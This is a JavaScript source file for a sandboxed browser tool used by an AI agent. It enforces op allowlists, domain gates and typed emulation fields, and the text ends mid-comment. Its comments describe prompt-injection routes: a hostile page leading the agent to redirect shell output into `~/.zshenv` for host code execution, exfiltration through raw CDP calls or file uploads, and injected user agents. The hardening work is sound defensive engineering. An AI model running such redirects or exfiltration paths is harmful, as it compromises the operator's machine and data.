// browser_tool_impl.mjs — the PURE, plugin-free logic behind the opencode
// browser-agent's ONLY tool (`browser.js`). Kept separate from browser.js so it
// carries NO `@opencode-ai/plugin` import and is unit-testable with `node:test`
// (mock `fetchImpl` + `readToken`). opencode's tool loader globs `tools/*.{ts,js}`
// only, so this `.mjs` sibling is NOT registered as a tool — it is merely imported
// by browser.js (verified against opencode 1.18.4 via `opencode debug agent`).
//
// WHY this exists (the security reversal — PR #180 / RCE fix): the browser-agent
// previously got opencode's raw *bash* tool, permission-scoped to `browser --tab
// <id> *`. A shell OUTPUT REDIRECTION (`browser --tab N eval '…' >> ~/.zshenv`) is
// NOT a separate command node, so it rode the allowed `browser` command through
// opencode's wildcard glob and the shell performed the redirect → a hostile page
// could induce the model to write to a sourced dotfile → host RCE. The fix removes
// the shell entirely: the model calls THIS tool with TYPED arguments (op + a few
// optional scalars). There is no command string, so no `>`/`>>`/`;`/`|`/`$()`/
// backtick surface exists at all. The tool talks to the loopback browser-bridge
// server directly over HTTP (zero subprocess, zero shell).
//
// The MODEL cannot choose the tab, the instance, or the domain policy: those are
// forced by ENV the `browser-agent` wrapper sets per run (BROWSER_AGENT_TAB, …).
// Enforcement (op allowlist + domain deny + forced tab) lives HERE, in-process.

import { readFileSync, appendFileSync } from "node:fs";
import { homedir } from "node:os";

// Ops the agent may request → the server-side op name the bridge understands.
// (Mirrors the `browser` CLI's own mapping; NO open/close/tabs/release — the
// wrapper owns the tab lifecycle and `tabs` would leak other tabs' URLs.)
//
// The CDP ops (frames/click/type/key + `--frame` reads) are here so the agent can
// DRIVE an app (reach an in-app tab, submit a generation) and read INTO a
// cross-origin iframe. CRITICAL (RCE-class invariant, PR #180 lineage): these are
// BOUNDED TYPED ops only. There is NO `cdp`/`method`/`params` op — the model can
// never send an arbitrary CDP command (Page.navigate file://, Runtime.evaluate for
// exfil, Browser.*, Target.*, Fetch.*). buildRequest below constructs the wire body
// field-by-field from a WHITELIST, so any extra arg the model smuggles (a `cdp`, a
// `tab`, a `method`) is silently dropped, never forwarded. Keep it a whitelist.
// `wake` UN-THROTTLES the agent's OWN (env-forced) tab so a foreground-REQUIRING
// SPA (throttled while the agent's tab is backgrounded by design) finishes loading
// and can be driven — via CDP focus emulation, WITHOUT moving the operator's
// focus. Own-tab-scoped like every other op (the tab is forced by env, not a model
// arg). Typed, bounded, NO raw passthrough.
//
// ⚠ `activate` is DELIBERATELY ABSENT from OP_TO_SERVER — the autonomous model can
// NEVER reach it, not even via BROWSER_AGENT_ALLOWED_OPS. It foregrounds the tab
// and (server-side) raises the Brave window through i3-msg, i.e. it TAKES THE
// OPERATOR'S SCREEN. Telemetry caught a driving session calling it 1–5×/minute,
// grabbing the screen on nearly every interaction. Focus theft is a decision only
// a human sitting at the machine should make, so it stays on the `browser` CLI
// (operator-only) and `wake` gives the agent the capability it actually needed.
// This is a stronger stance than `upload`'s opt-in, and intentionally so: `upload`
// is a risk the operator can knowingly accept per run, whereas a model stealing
// focus has no legitimate autonomous use at all.
// ⚠ `ping` is DELIBERATELY ABSENT from OP_TO_SERVER. It is an OPERATOR
// diagnostic for extension staleness — "is the build I just deployed actually
// the one Brave loaded?" — answered by {pong, extensionVersion, id, ops}. The
// model cannot ACT on that answer: it cannot reload an unpacked extension, it
// cannot restart Brave, and it cannot re-run a home-manager switch. It also
// reads NO page state, so it cannot inform a browsing decision either. An op
// whose only possible follow-up is unavailable to the caller is pure token cost
// with no available action, so it stays operator-only on the `browser` CLI —
// excluded like `activate`, not gated like `upload`.
//
// `emulate` IS reachable, and DEFAULT-ON (#316). It used to be excluded here on
// the stated grounds that it "leaves STICKY PER-TAB STATE THAT OUTLIVES THE OP …
// until explicitly reset or the tab is replaced". THAT OBSERVATION IS CORRECT —
// what was wrong was the conclusion drawn from it, and the counter-argument this
// comment used to carry (that overrides "die at detach" so a crashed agent could
// not leave a distorted browser) is FALSE. Measured 2026-08-03 on extension 0.7.2
// with a fresh-tab control:
//
//   fresh tab, never emulated   innerWidth 1124   (control — the read path works)
//   after `emulate iphone-15`   innerWidth  393
//   after `emulate --reset`     innerWidth  393   ← NOT restored
//   after `--reset` + re-nav    innerWidth  393   ← still NOT restored
//
// on that build the reset DID send and report its clears
// (`Emulation.clearDeviceMetricsOverride` / `setTouchEmulationEnabled` /
// `setUserAgentOverride`) and the size survived them, which is why the SHIPPED
// build sends nothing on reset at all — it only stops re-applying. Every other
// override does revert on its own — dpr, maxTouchPoints, pointer:coarse,
// prefers-color-scheme, userAgent, timeZone — at the debugger detach, not by any
// clear. Only the viewport SIZE is sticky; it survives the detach, the clear and a
// re-navigation. THE MECHANISM IS NOT ESTABLISHED (a render-widget resize residue
// is the leading hypothesis, not a finding). CLOSING THE TAB is the only known
// remedy. That is #319; the operator-side workaround is
// `browser emulate --reset --recreate`.
//
// SO WHY IS IT STILL DEFAULT-ON FOR THE AGENT? Because on the agent path the
// remedy is already unconditional: THE WRAPPER OWNS ITS TAB'S WHOLE LIFECYCLE. It
// `open`s the run's own tab under the run's own SESSION_ID and closes it on every
// exit path (`trap _cleanup_all EXIT INT TERM`, browser-agent:373) — and closing
// is exactly what un-sticks the viewport. Blast radius is bounded server-side, not
// by convention: server.py's OWNED_TAB_ONLY_OPS = {"emulate"} refuses the op with
// `not_owned_tab` on any tab the calling session did not `open` itself, so the
// sticky residue can never reach one of the OPERATOR's tabs on this path.
//
// THE RESIDUAL, PLAINLY: a SIGKILL (or a host that dies) bypasses the trap, and
// then the run's tab is orphaned STUCK AT THE EMULATED SIZE. `--reset` cannot
// repair that tab — it has to be closed. It is the agent's own tab, not the
// operator's, but it is a real leak and it is not fixed by any code here.
//
// The one real residual is the transient "an extension is debugging this browser"
// banner from the CDP attach — which `eval`, `screenshot` (fullpage/emulated) and
// `wake` already raise on every call, so it is not a new capability class. Like
// those, `emulate` is treated as MUTATING for dry-run purposes (see runBrowserOp)
// so a `--dry-run` never attaches the debugger to the operator's browser.
//
// What it BUYS: the agent can check a page at a real phone viewport instead of
// guessing from a desktop DOM — the thing it is most often asked to do and could
// not do at all. buildRequest builds the emulate body from a TYPED WHITELIST like
// every other op (no raw passthrough), and mirrors protocol.js's bounds so an
// out-of-range value is refused before it reaches the bridge.
//
// `context` IS reachable (below). It is a cheap READ of page state — url,
// domain, path, searchParams, title, tabId — and reads NO DOM content, so it is
// strictly less powerful than the `text`/`html` the agent already has, while
// letting the model confirm WHERE it actually is after a nav/redirect without
// paying for a full page read. Its absence here was an oversight, not a
// decision: this file was last edited 2026-07-31 (#243) and `context` only
// reached server.py's ALLOWED_OPS on 2026-08-01 (#263), so the agent-surface
// mapping has never been looked at since the op came into existence.
// `whoami` is a READ-ONLY, GLOBAL diagnostic: it is NOT a /cmd op (it hits the
// server's GET /whoami, has no tab, drives nothing) — it lets the agent confirm
// which HOST + which browser profile it is connected to before acting. It maps to
// itself only so it passes the uniform op-allowlist gate below; buildRequest
// SHORT-CIRCUITS it to a GET before any /cmd body is built. Metadata only (host
// label, instance labels, active-tab domains, versions — never page content).
export const OP_TO_SERVER = Object.freeze({
  text: "text",
  html: "getHtml",
  eval: "eval",
  nav: "nav",
  screenshot: "screenshot",
  frames: "frames",
  click: "click",
  type: "type",
  key: "key",
  wake: "wake",
  upload: "upload",
  context: "context",
  emulate: "emulate",
  whoami: "whoami",
});

// The AUTONOMOUS model's DEFAULT op set — 13 ops, identical to browser.js's typed
// `op` enum, the agent-md capability table, and the README's published contract.
// Keep those four in lockstep (tests/browser_tool.test.mjs parses all four and
// asserts they match, so a drift fails CI).
//
// `upload` is DELIBERATELY ABSENT here. It populates an <input type=file> from a
// caller-chosen ABSOLUTE PATH via CDP DOM.setFileInputFiles, with NO path
// allowlist: Chrome reads the file by path itself (same host, no bytes cross the
// bridge), but the CONTENTS of any readable file could be posted to the target
// site. That exfil tradeoff is acceptable for the OPERATOR driving the `browser`
// CLI by hand (deliberate, audit-logged, human-chosen path) — it is NOT acceptable
// as a default for a cheap model that is by design pointed at untrusted,
// prompt-injecting pages, where the "caller" choosing the path can effectively be
// the page. `upload` stays in OP_TO_SERVER so it remains REACHABLE, but only via
// an explicit, deliberate `BROWSER_AGENT_ALLOWED_OPS` opt-in (documented in the
// README) — never by default, and never by anything the model can set itself.
export const ALLOWED_OPS_DEFAULT = Object.freeze([
  "text", "html", "eval", "nav", "screenshot",
  "frames", "click", "type", "key", "wake", "context", "emulate", "whoami",
]);

export const TEXT_MAX_BYTES_DEFAULT = 32768;
const SCREENSHOT_NOTE_MAX = 200; // never spill a base64 image blob into the model

// A refusal the model is expected to SEE and adapt to (bad op / denied domain /
// missing field). Thrown so opencode surfaces it as a tool error to the model;
// the run continues (the model can try another op/domain).
export class BrowserToolRefusal extends Error {
  constructor(reason) {
    super(`browser-tool: refused: ${reason}`);
    this.name = "BrowserToolRefusal";
    this.reason = reason;
  }
}

function _list(s) {
  // Split a space/comma separated domain list into lowercased, non-empty tokens.
  return String(s || "")
    .split(/[\s,]+/)
    .map((x) => x.trim().toLowerCase())
    .filter(Boolean);
}

export function hostOf(url) {
  try {
    return (new URL(String(url)).hostname || "").toLowerCase();
  } catch {
    return "";
  }
}

// The ONLY schemes a `nav` may target. Anything else — file:, data:, about:,
// javascript:, chrome:, blob:, view-source:, … — has an EMPTY hostname, so the
// host allow/deny gate (hostDenied) treats it as "no host → not gated" and would
// let it through, bypassing the operator's `--allow-domains` confinement. Such a
// URL could load attacker HTML in the owned tab, run inline script, or (if the
// browser's file-URL toggle is on) read a local file. So a non-http(s) nav is
// refused OUTRIGHT, before any bridge fetch, regardless of the allow/deny lists
// (PR #180 hardening 1).
export const NAV_ALLOWED_SCHEMES = Object.freeze(["http:", "https:"]);

// The lowercased URL scheme (protocol, incl. the trailing ":"), or "" if the URL
// does not parse (an unparseable/relative nav target has no confirmable scheme →
// it is refused just like a disallowed scheme).
export function navSchemeOf(url) {
  try {
    return (new URL(String(url)).protocol || "").toLowerCase();
  } catch {
    return "";
  }
}

function _matches(host, domain) {
  // host equals the domain, or is a subdomain of it (`.example.com`).
  return host === domain || host.endsWith("." + domain);
}

// Domain policy: a deny match wins; if an allowlist is set, a host matching NONE
// of it is treated as denied; otherwise allowed. (Same semantics the old PATH-shim
// guard enforced, now moved in-process — Fix #2: deny is binding on every nav.)
export function hostDenied(host, allowList, denyList) {
  if (!host) return false; // no resolvable host (e.g. about:blank) → not gated here
  for (const d of denyList) if (_matches(host, d)) return true;
  if (allowList.length) {
    for (const d of allowList) if (_matches(host, d)) return false;
    return true;
  }
  return false;
}

// BROWSER_AGENT_ALLOWED_OPS — the operator's explicit op-set override (a space/
// comma separated list). Unset/empty → ALLOWED_OPS_DEFAULT (the 13-op browser-only
// set). Set → it REPLACES the default wholesale, so it can both narrow the agent
// (`"text,html"`) and deliberately re-enable an off-by-default op such as `upload`.
// It is read from the wrapper's environment, which the MODEL cannot influence.
export function allowedOpsFromEnv(env) {
  const raw = _list(env.BROWSER_AGENT_ALLOWED_OPS);
  return raw.length ? raw : [...ALLOWED_OPS_DEFAULT];
}

// Resolve the FORCED tab from env. The model has no tab argument at all, so it can
// never target another tab; a missing/invalid BROWSER_AGENT_TAB is a hard misconfig
// (the wrapper always sets it) and is refused as a disowned tab.
export function forcedTab(env) {
  const raw = String(env.BROWSER_AGENT_TAB ?? "").trim();
  if (!/^[0-9]+$/.test(raw)) {
    throw new BrowserToolRefusal(`disowned_tab:${raw || "<unset>"}`);
  }
  return Number(raw);
}

// Forward an optional `--frame` (frameId or url-substring) so a read/click runs
// INSIDE a cross-origin frame. A TYPED scalar only — it selects a frame, it is NOT
// a CDP command. Bounded to a length so a pathological value can't bloat the body.
function _addFrame(body, args) {
  if (args && args.frame != null && args.frame !== "") {
    body.frame = String(args.frame).slice(0, 512);
  }
}

// --- `emulate` argument validation ----------------------------------------- //
//
// extension/protocol.js's normalizeEmulation is THE authority on what an emulate
// command may contain (EMULATION_LIMITS / EMULATION_ORIENTATIONS /
// EMULATION_COLOR_SCHEMES). These constants MIRROR it rather than import it, and
// that is forced, not lazy: the browser-agent wrapper copies ONLY browser.js and
// this file into the per-run scratch project, so an
// `import … from "../../extension/protocol.js"` would resolve in the repo and
// throw MODULE_NOT_FOUND in every real run. tests/browser_tool.test.mjs imports
// BOTH and asserts these values equal protocol.js's, so the mirror cannot drift
// silently.
//
// Client-side validation is a REFUSAL, not a re-implementation: it refuses the
// nonsense values early (with the same `invalid_emulation:<field>` names the
// extension uses, so one vocabulary reaches the model either way) and forwards
// only typed scalars. Anything semantic that needs the preset table — an unknown
// device name — is left to the extension, which owns that table.
export const EMULATION_LIMITS_MIRROR = Object.freeze({
  minDimension: 1,
  maxDimension: 10000,
  minScaleFactor: 0.1,
  maxScaleFactor: 10,
  maxTouchPoints: 16,
  maxUserAgentChars: 1024,
  maxTimezoneChars: 64,
});
export const EMULATION_ORIENTATIONS_ALLOWED = Object.freeze(["portrait", "landscape"]);
export const EMULATION_COLOR_SCHEMES_ALLOWED =
  Object.freeze(["light", "dark", "no-preference"]);
const EMULATE_DEVICE_MAX_CHARS = 64;

// The model-facing arg name -> the wire field normalizeEmulation reads. One
// differs deliberately (deviceScaleFactor is self-describing to a model; the wire
// name is the CLI's terse dsf).
//
// `geo`, `touch`, `userAgent` and `timezone` are NOT offered to the agent. The
// OPERATOR CLI keeps all four — this asymmetry is the point, not an oversight.
//
//   * `geo` spoofs the operator's LOCATION, which has nothing to do with the
//     viewport/mobile-rendering question the agent has, and is a fingerprinting
//     surface handed to a model reading untrusted pages.
//   * `userAgent` and `timezone` are THE SAME CLASS and were excluded for the
//     same reason (#F7). Both are identity a page can read; both are chosen by a
//     model whose input includes pages it does not control; and emulation is
//     STICKY FOR THE WHOLE RUN, so a prompt-injected UA is not confined to the
//     page that injected it — it rides along on every later `nav`, including to
//     an authenticated site. A DEVICE PRESET still sets a matching UA (and client
//     hints) server-side, so the legitimate mobile-testing path is untouched;
//     what is removed is the model picking an ARBITRARY one.
//   * `touch` is merely redundant: a preset carries its own touch support, and a
//     raw `maxTouchPoints` turns touch on by itself (normalizeEmulation).
//
// `userAgent`/`timezone` are REFUSED BY NAME rather than silently dropped
// (`emulation_field_operator_only:<field>`): a silent drop would leave the model
// believing it set a UA it did not set, and then reasoning about a page it read
// under the wrong identity. `geo`/`touch` keep their pre-existing silent-drop
// behaviour — they were NEVER a declared arg, so no model can believe it passed
// one, and the raw-CDP-passthrough test pins that drop deliberately.
const EMULATE_FIELD_TO_WIRE = Object.freeze({
  device: "device",
  width: "width",
  height: "height",
  deviceScaleFactor: "dsf",
  mobile: "mobile",
  maxTouchPoints: "maxTouchPoints",
  orientation: "orientation",
  colorScheme: "colorScheme",
});

// Emulation fields the OPERATOR CLI accepts, the AGENT may not, and that were
// PREVIOUSLY DECLARED ARGS — so a model could plausibly still pass one and must
// be told, by name, that it did not take effect. Refused before anything else in
// _addEmulation so the refusal is reachable even alongside `reset` (which
// short-circuits) or alone (which would otherwise refuse with the wrong name,
// `emulate_needs_device_or_params`). `geo`/`touch` are NOT here: they were never
// declared, so they stay on the silent-drop path the whitelist already gives
// every unknown key.
export const EMULATE_OPERATOR_ONLY_FIELDS = Object.freeze(["userAgent", "timezone"]);

function _emuInt(v, field, min, max) {
  const n = Number(v);
  if (!Number.isFinite(n) || !Number.isInteger(n) || n < min || n > max) {
    throw new BrowserToolRefusal(`invalid_emulation:${field}`);
  }
  return n;
}

function _emuNumber(v, field, min, max) {
  const n = Number(v);
  if (!Number.isFinite(n) || n < min || n > max) {
    throw new BrowserToolRefusal(`invalid_emulation:${field}`);
  }
  return n;
}

function _emuBool(v, field) {
  if (typeof v === "boolean") return v;
  if (v === "true" || v === 1 || v === "1") return true;
  if (v === "false" || v === 0 || v === "0") return false;
  throw new BrowserToolRefusal(`invalid_emulation:${field}`);
}

// NOTE: there is no `_emuUserAgent`/`_emuTimezone` here any more. They validated
// fields the agent may no longer pass at all (see EMULATE_OPERATOR_ONLY_FIELDS),
// and keeping a validator for an unreachable field is how a "we still check it"
// belief outlives the code path. `maxUserAgentChars`/`maxTimezoneChars` stay in
// EMULATION_LIMITS_MIRROR because that object mirrors protocol.js's
// EMULATION_LIMITS wholesale and a drift test compares them key for key — the
// OPERATOR CLI still sends both fields, and the extension still enforces them.

// Bounded, charset-restricted preset NAME only. The preset TABLE lives in the
// extension (DEVICE_PRESETS), so an unrecognised-but-well-formed name is
// forwarded and comes back as `unknown_preset:<name>` from the authority that
// owns the list — duplicating the table here is exactly the drift this file
// avoids everywhere else.
function _emuDevice(v) {
  const s = typeof v === "string" ? v.trim() : "";
  if (!s || s.length > EMULATE_DEVICE_MAX_CHARS || !/^[A-Za-z0-9._-]+$/.test(s)) {
    throw new BrowserToolRefusal("invalid_emulation:device");
  }
  return s;
}

// Populate an `emulate` /cmd body from a WHITELIST of typed scalars. Never
// forwards a raw arg: a smuggled `cdp`/`method`/`geo`/`tab` is simply not read.
function _addEmulation(body, args) {
  const a = args || {};
  const has = (k) => a[k] !== undefined && a[k] !== null && a[k] !== "";

  // OPERATOR-ONLY fields first, so the refusal is REACHABLE: the `reset`
  // short-circuit below returns before any per-field handling, and the
  // "describes nothing" refusal fires before it too, so a check placed lower
  // could never run for `{reset:true, userAgent:…}` or for a UA on its own.
  for (const f of EMULATE_OPERATOR_ONLY_FIELDS) {
    if (has(f)) throw new BrowserToolRefusal(`emulation_field_operator_only:${f}`);
  }

  // `--reset` means "stop re-applying", and combining it with a device
  // description is contradictory rather than resolvable by precedence (do you
  // want the viewport or not?) — protocol.js refuses it, so refuse it here too.
  const wantsReset = a.reset === true || a.reset === "true";
  const supplied = Object.keys(EMULATE_FIELD_TO_WIRE).filter(has);
  if (wantsReset) {
    if (supplied.length) {
      throw new BrowserToolRefusal("invalid_emulation:reset_with_params");
    }
    body.reset = true;
    return;
  }
  // Mirrors protocol.js: an emulate that describes nothing is a no-op the caller
  // almost certainly did not mean.
  if (!supplied.length) throw new BrowserToolRefusal("emulate_needs_device_or_params");

  if (has("device")) body.device = _emuDevice(a.device);
  // A viewport needs BOTH dimensions — Emulation.setDeviceMetricsOverride takes
  // both or neither, and inferring the other from the operator's real window
  // would make the result depend on their window size. A preset supplies the
  // missing half, so the pairing is only required when there is no preset.
  if (!has("device") && has("width") !== has("height")) {
    throw new BrowserToolRefusal("invalid_emulation:width_and_height_together");
  }
  if (has("width")) {
    body.width = _emuInt(a.width, "width", EMULATION_LIMITS_MIRROR.minDimension,
                         EMULATION_LIMITS_MIRROR.maxDimension);
  }
  if (has("height")) {
    body.height = _emuInt(a.height, "height", EMULATION_LIMITS_MIRROR.minDimension,
                          EMULATION_LIMITS_MIRROR.maxDimension);
  }
  if (has("deviceScaleFactor")) {
    body.dsf = _emuNumber(a.deviceScaleFactor, "dsf",
                          EMULATION_LIMITS_MIRROR.minScaleFactor,
                          EMULATION_LIMITS_MIRROR.maxScaleFactor);
  }
  if (has("mobile")) body.mobile = _emuBool(a.mobile, "mobile");
  if (has("maxTouchPoints")) {
    body.maxTouchPoints = _emuInt(a.maxTouchPoints, "maxTouchPoints", 1,
                                  EMULATION_LIMITS_MIRROR.maxTouchPoints);
  }
  if (has("orientation")) {
    const o = String(a.orientation);
    if (!EMULATION_ORIENTATIONS_ALLOWED.includes(o)) {
      throw new BrowserToolRefusal("invalid_emulation:orientation");
    }
    body.orientation = o;
  }
  if (has("colorScheme")) {
    const cs = String(a.colorScheme);
    if (!EMULATION_COLOR_SCHEMES_ALLOWED.includes(cs)) {
      throw new BrowserToolRefusal("invalid_emulation:colorScheme");
    }
    body.colorScheme = cs;
  }
}

function _coerceMaxBytes(v) {
  if (v === undefined || v === null || v === "") return TEXT_MAX_BYTES_DEFAULT;
  const n = Number(v);
  if (!Number.isFinite(n) || n < 0 || !Number.isInteger(n)) {
    throw new BrowserToolRefusal(`bad_maxBytes:${v}`);
  }
  return n;
}

// Build the exact {url, headers, body} for a POST /cmd, enforcing the op allowlist,
// the forced tab, and (for nav/eval) the domain policy. Throws BrowserToolRefusal
// on any policy violation. `token` is the pre-read bearer secret.
export function buildRequest(args, env, token) {
  const op = String((args && args.op) || "");
  const allowed = allowedOpsFromEnv(env);
  // Object.hasOwn, NOT `in`: `in` walks the prototype chain, so `"constructor" in
  // OP_TO_SERVER` (and toString/valueOf/…) is true. Not exploitable today — it would
  // still need an operator-set BROWSER_AGENT_ALLOWED_OPS naming one, and the
  // resulting body fails server-side — and `activate` is not a prototype property so
  // the focus-theft control has no bypass. Own-property is simply the correct check.
  if (!allowed.includes(op) || !Object.hasOwn(OP_TO_SERVER, op)) {
    throw new BrowserToolRefusal(`op_not_allowed:${op || "<none>"}`);
  }
  // whoami is a GLOBAL, read-only GET /whoami — no tab, no /cmd body. Short-
  // circuit BEFORE forcedTab (it is not tab-scoped) and before any /cmd body is
  // built. No typed args are forwarded (nothing to smuggle).
  if (op === "whoami") {
    const host = env.BROWSER_BRIDGE_HOST || "127.0.0.1";
    const port = env.BROWSER_BRIDGE_PORT || "8788";
    return {
      method: "GET",
      url: `http://${host}:${port}/whoami`,
      headers: {
        Authorization: `Bearer ${token}`,
        Host: "127.0.0.1", // #168 loopback Host-allowlist invariant
      },
      body: null,
    };
  }
  const tab = forcedTab(env); // may throw disowned_tab
  const allowList = _list(env.BROWSER_AGENT_ALLOW_DOMAINS);
  const denyList = _list(env.BROWSER_AGENT_DENY_DOMAINS);

  const body = { op: OP_TO_SERVER[op], tab };
  const instance = String(env.BROWSER_AGENT_INSTANCE ?? "").trim();
  if (instance) body.target = instance;

  if (op === "nav") {
    const url = args && args.url;
    if (!url) throw new BrowserToolRefusal("nav_missing_url");
    // Scheme gate FIRST: a non-http(s) target (file:/data:/about:/javascript:/…)
    // has no host and would slip past the domain confinement — refuse it here,
    // before host allow/deny is even consulted.
    const scheme = navSchemeOf(url);
    if (!NAV_ALLOWED_SCHEMES.includes(scheme)) {
      throw new BrowserToolRefusal(`nav_scheme_denied:${scheme || "<none>"}`);
    }
    const host = hostOf(url);
    if (hostDenied(host, allowList, denyList)) {
      throw new BrowserToolRefusal(`domain_blocked:${host || url}`);
    }
    body.url = String(url);
  } else if (op === "eval") {
    const js = args && args.js;
    if (!js) throw new BrowserToolRefusal("eval_missing_js");
    // Best-effort defence-in-depth (mirrors the retired guard shim): refuse an
    // eval that literally references a denied host. A cheap model cannot be fully
    // sandboxed — `nav` is the real navigation gate; this catches the obvious
    // `location.href='https://denied/'` case. Documented as best-effort.
    const jl = String(js).toLowerCase();
    for (const d of denyList) {
      if (jl.includes(d)) throw new BrowserToolRefusal(`eval_references_blocked:${d}`);
    }
    body.js = String(js);
    _addFrame(body, args);
  } else if (op === "text") {
    if (args && args.selector) body.selector = String(args.selector);
    body.maxBytes = _coerceMaxBytes(args ? args.maxBytes : undefined);
    _addFrame(body, args);
  } else if (op === "html") {
    _addFrame(body, args);
  } else if (op === "click") {
    if (!args || !args.selector) throw new BrowserToolRefusal("click_missing_selector");
    body.selector = String(args.selector);
    _addFrame(body, args);
  } else if (op === "type") {
    const text = args && args.text;
    if (text == null || text === "") throw new BrowserToolRefusal("type_missing_text");
    body.text = String(text);
    if (args && args.selector) body.selector = String(args.selector);
    _addFrame(body, args);
  } else if (op === "key") {
    if (!args || !args.key) throw new BrowserToolRefusal("key_missing_key");
    body.key = String(args.key);
    if (args && args.selector) body.selector = String(args.selector);
    _addFrame(body, args);
  } else if (op === "wake") {
    // Optional bounded un-throttle settle. A TYPED non-negative int only — the
    // extension clamps it to its own cap; an invalid value is refused here (never
    // forwarded raw). No other field: the tab is forced by env.
    if (args && args.waitMs != null && args.waitMs !== "") {
      const n = Number(args.waitMs);
      if (!Number.isFinite(n) || n < 0 || !Number.isInteger(n)) {
        throw new BrowserToolRefusal(`bad_waitMs:${args.waitMs}`);
      }
      body.waitMs = n;
    }
  } else if (op === "upload") {
    // Populate a file input. TYPED scalars only: selector + path (+ optional frame).
    // NOT in ALLOWED_OPS_DEFAULT — unreachable unless the operator explicitly opts
    // in via BROWSER_AGENT_ALLOWED_OPS (see the note on ALLOWED_OPS_DEFAULT). When
    // opted in, ANY path is allowed (the explicit exfil tradeoff) and the server
    // audit-logs every upload. Only these fields reach the wire — a smuggled
    // cdp/method/params is dropped (the whitelist build below).
    if (!args || !args.selector) throw new BrowserToolRefusal("upload_missing_selector");
    if (!args.path) throw new BrowserToolRefusal("upload_missing_path");
    body.selector = String(args.selector);
    body.path = String(args.path);
    _addFrame(body, args);
  } else if (op === "emulate") {
    // Device emulation on the agent's OWN (env-forced) tab — server.py's
    // OWNED_TAB_ONLY_OPS refuses it on any other. TYPED scalars from a whitelist,
    // bounds mirrored from protocol.js. NO `frame`: emulation is per-TAB.
    _addEmulation(body, args);
  }
  // frames / screenshot / context: no extra typed fields (the tab is forced by
  // env, and `context` reports on that tab only).

  const host = env.BROWSER_BRIDGE_HOST || "127.0.0.1";
  const port = env.BROWSER_BRIDGE_PORT || "8788";
  const sessionId = String(env.BROWSER_AGENT_SESSION_ID || "browser-agent");
  return {
    url: `http://${host}:${port}/cmd`,
    headers: {
      Authorization: `Bearer ${token}`,
      Host: "127.0.0.1", // loopback Host-allowlist invariant (#168)
      "X-Session-Id": sessionId, // routing-only; forced `tab` overrides ownership
      // 🔴 X-Session-Origin: this request was NOT issued by the session whose id
      // X-Session-Id carries. browser-agent captures its INVOKER's id (its
      // `--print-session-id` call) and forwards it here purely so routing and the
      // audit trail stay consistent with the `open` that created our tab. The
      // telemetry `session` column means "the agent session that ISSUED this
      // command"; for a nested run the issuer is this opencode agent, whose own id
      // we do not have. Declaring the origin makes the server record the forwarded
      // id as `origin_session` (the causal PARENT) instead of attributing N nested
      // calls to the operator's own session — ~11% of bridge commands in 14d.
      "X-Session-Origin": "browser-agent",
      "Content-Type": "application/json",
    },
    body,
  };
}

// --- deterministic hidden-tab auto-wake ------------------------------------ //
// WHY (measured, browser-bridge-deepseek-measurement-2026-07-31.md §3.2): the
// agent's tab is ALWAYS opened `active:false`, so it is ALWAYS hidden and always
// throttled. The server already self-announces that (`data.hidden:true` +
// HIDDEN_TAB_NOTE on every read — extension/protocol.js annotateVisibility), but
// summarizeResult used to return a BARE `data.text`/`data.html` and throw both
// away. When a throttled SPA renders a sparse-but-PLAUSIBLE shell, the model read
// the shell, could not tell the tab was hidden, and returned a confident WRONG
// answer with `status:"ok"` and evidence that quoted the shell verbatim. That was
// 1 of 13 `ok` runs (7.7%) and the ONLY failure mode found.
//
// The note reached the model only BY ACCIDENT before: via the `eval` branch, and
// ONLY when the value was NULLISH — `JSON.stringify(v ?? data)` falls back to the
// whole `data` (note included) for null/undefined alone. A non-string but non-null
// value (a number, an object, an array) stringifies the VALUE and strips the note
// exactly like the string path did. (The original PR text said "non-string"; that
// was wrong and is corrected here — the accident was narrower than described.)
// That accident saved two runs and was absent in the failing one. So the fix is
// DETERMINISTIC, not modelled: on the first hidden `text`/`html` read of a page
// the tool ITSELF issues `wake`, re-reads, and returns the re-read. The model
// never has to notice or decide.
//
// `wake`, NOT `activate` — wake un-throttles via CDP focus emulation and moves NO
// focus; `activate` takes the operator's screen and is unreachable by the agent by
// design (absent from OP_TO_SERVER). This is what makes an automatic un-throttle
// acceptable for an autonomous background agent at all.

// The ops that trigger an automatic wake. Deliberately NOT `eval`: an eval is a
// caller-authored expression whose re-execution may not be idempotent. eval still
// gets the SIGNAL (see HIDDEN_SIGNAL_OPS) — it just is not re-run automatically.
export const AUTO_WAKE_OPS = Object.freeze(["text", "html"]);

// The ops whose summary carries the hidden/throttle signal when `data.hidden` is
// true. This is the "stop discarding the signal REGARDLESS" half of the fix: even
// with auto-wake, a still-hidden or failed-wake read must be VISIBLE, not silent.
export const HIDDEN_SIGNAL_OPS = Object.freeze(["text", "html", "eval"]);

// Ops that REPLACE the document without necessarily changing the URL — a form
// POST to the same URL, `location.reload()`, a same-URL SPA remount. The page key
// is the read's url, so those are INVISIBLE to it: the key matches, the page is
// reported as already-woken, and a freshly-throttled document gets read as a shell
// and labelled post-wake. So a successful one of these voids the tab's records.
// Over-forgetting costs one extra wake; under-forgetting costs a WRONG ANSWER.
//
// KNOWN COST, deliberately accepted: this is unconditional, so a purely READ-ONLY
// `eval` also voids the verdict and the next read pays a fresh wake. There is no
// cheap, sound way to tell a read-only eval from a document-replacing one — a
// keyword scan of the `js` string is a heuristic on attacker-adjacent input and
// misses `el.click()` on a submit button entirely.
//
// ⚠ THE RIGHT FIX IS NOT "make these four ops precise" — do not build that.
// A `click` can start a navigation that COMMITS ASYNCHRONOUSLY, so any per-op
// probe (including a CDP `Page.getFrameTree` loaderId sampled right after the
// click) still sees the OLD document and would UNDER-invalidate — the dangerous
// direction. The sound design is to attach a per-document identity to EVERY
// READ'S PAYLOAD and key the wake verdict on `(url, documentId)`. Then a document
// replacement changes the key by construction, sync or async; this whole list
// disappears; and the same-URL remount the url key cannot see is fixed for free.
// Prefer `performance.timeOrigin` read from the ISOLATED world over a CDP
// loaderId: it rides the existing read path with no debugger attach (the
// expensive thing this design avoids) and is naturally per-frame, which `--frame`
// reads need. Where a content script cannot inject (`chrome://`, the PDF viewer)
// the id is absent and MUST fail CLOSED — unknown document, never reuse a verdict
// — which is exactly the empty-key handling markPageWakeAttempt already has.
// That is an extension-side change, so it belongs in the next batch that already
// requires a manifest bump and a full Brave re-point.
export const PAGE_INVALIDATING_OPS = Object.freeze(["nav", "click", "key", "eval"]);

// Bound the per-tab page-key map so a long run that navigates many times cannot
// grow it without limit. On overflow the map is cleared (worst case: one extra
// wake), never allowed to grow.
export const AUTO_WAKE_PAGE_CAP = 32;

// TOTAL automatic wakes per tab per run, INDEPENDENT of the page key — the
